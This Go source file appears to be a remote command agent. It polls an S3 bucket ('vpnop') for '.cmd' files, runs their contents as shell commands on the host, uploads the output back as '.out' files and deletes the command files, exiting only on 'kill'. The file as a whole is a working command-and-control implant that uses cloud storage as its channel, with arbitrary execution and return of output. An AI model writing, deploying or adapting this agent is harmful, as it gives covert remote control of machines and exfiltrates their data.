package main

import (
	"bytes"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3"
	"github.com/aws/aws-sdk-go/service/s3/s3manager"
)

var bucket string
var AccessKeyID string
var SecretAccessKey string
var MyRegion string

func main() {

	bucket := "vpnop"

	sess := ConnectAws()
	for {
		files := getFiles(sess, "vpnop")
		for _, f := range files {
			fmt.Println("read file: " + f)
			file := downloadFile(sess, f, bucket)
			dat, _ := os.ReadFile(file.Name())
			fmt.Print(string(dat))
			runCommand(string(dat), f, sess, bucket, file.Name())
		}
		time.Sleep(3 * time.Second)
	}
}

func ConnectAws() *session.Session {
	AccessKeyID = ""
	SecretAccessKey = ""
	MyRegion = "us-east-2"
	sess, err := session.NewSession(
		&aws.Config{
			Region: aws.String(MyRegion),
			Credentials: credentials.NewStaticCredentials(
				AccessKeyID,
				SecretAccessKey,
				"", // a token will be created when the session it's used.
			),
		})
	if err != nil {
		panic(err)
	}
	return sess
}

func getFiles(sess *session.Session, bucket string) []string {
	files := ListObjects(sess, bucket)
	var gfiles []string
	for _, f := range files.Contents {
		if filepath.Ext(strings.TrimSpace(*f.Key)) == ".cmd" {
			gfiles = append(gfiles, *f.Key)
		}
	}
	return gfiles
}

func downloadFile(sess *session.Session, item string, bucket string) *os.File {
	file, err := os.Create(item)
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()

	downloader := s3manager.NewDownloader(sess)
	numBytes, err := downloader.Download(file,
		&s3.GetObjectInput{
			Bucket: aws.String(bucket),
			Key:    aws.String(item),
		})
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("Downloaded", file.Name(), numBytes, "bytes")

	return file
}

func updateCmdStatus(sess *session.Session, out string, bucket string, key string) {
	filedir := createOutput(out)
	fmt.Println(filedir)
	Upload(sess, filedir, bucket, key)
}

func runCommand(commandStr string, cmdid string, sess *session.Session, bucket string, key string) error {
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	if len(arrCommandStr) < 1 {
		return errors.New("")
	}
	switch arrCommandStr[0] {
	case "kill":
		os.Exit(0)
	default:
		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		err := cmd.Run()
		if err != nil {
			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
			updateCmdStatus(sess, "Error", bucket, key)
			DeleteItem(sess, bucket, key)
			return nil
		}
		fmt.Println(out.String())
		updateCmdStatus(sess, out.String(), bucket, key)
		DeleteItem(sess, bucket, key)
		return nil
	}
	return nil
}

func ListObjects(sess *session.Session, bucket string) *s3.ListObjectsV2Output {
	svc := s3.New(sess)
	input := &s3.ListObjectsV2Input{
		Bucket:  aws.String(bucket),
		MaxKeys: aws.Int64(1000),
	}

	result, err := svc.ListObjectsV2(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			case s3.ErrCodeNoSuchBucket:
				fmt.Println(s3.ErrCodeNoSuchBucket, aerr.Error())
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}

	return result
}

func createOutput(out string) string {
	f, e := os.CreateTemp("", "*.out")
	if e != nil {
		panic(e)
	}
	defer f.Close()

	f, err := os.OpenFile(f.Name(),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err)
	}
	defer f.Close()
	if _, err := f.WriteString(out + "\n"); err != nil {
		log.Println(err)
	}

	return f.Name()
}

func Upload(s *session.Session, fileDir string, bucket string, key string) error {

	key = strings.TrimSuffix(key, filepath.Ext(key))
	key = key + ".out"

	// Open the file for use
	file, err := os.Open(fileDir)
	if err != nil {
		return err
	}
	filename := filepath.Base(fileDir)
	fmt.Println(filename)
	defer file.Close()

	// Get file size and read the file content into a buffer
	fileInfo, _ := file.Stat()
	var size int64 = fileInfo.Size()
	buffer := make([]byte, size)
	file.Read(buffer)

	// Config settings: this is where you choose the bucket, filename, content-type etc.
	// of the file you're uploading.
	_, err = s3.New(s).PutObject(&s3.PutObjectInput{
		Bucket:               aws.String(bucket),
		Key:                  aws.String(key),
		ACL:                  aws.String("private"),
		Body:                 bytes.NewReader(buffer),
		ContentLength:        aws.Int64(size),
		ContentType:          aws.String(http.DetectContentType(buffer)),
		ContentDisposition:   aws.String("attachment"),
		ServerSideEncryption: aws.String("AES256"),
	})
	fmt.Println(err)
	return err
}

func DeleteItem(sess *session.Session, bucket string, item string) error {
	svc := s3.New(sess)

	_, err := svc.DeleteObject(&s3.DeleteObjectInput{
		Bucket: aws.String(bucket),
		Key:    aws.String(item),
	})
	if err != nil {
		return err
	}

	err = svc.WaitUntilObjectNotExists(&s3.HeadObjectInput{
		Bucket: aws.String(bucket),
		Key:    aws.String(item),
	})
	if err != nil {
		return err
	}

	return nil
}
